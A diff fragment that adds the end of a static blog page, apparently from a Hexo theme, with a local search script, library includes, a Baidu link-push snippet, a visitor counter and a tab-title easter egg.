+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+    <script type="text/javascript"> var OriginTitile = document.title, st; document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "Σ(っ °Д °;)っ喔哟，崩溃啦！", clearTimeout(st)) : (document.title = "φ(゜▽゜*)♪咦，又好了！", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) })
+    </script>
+
+
+</body>
+
+</html>
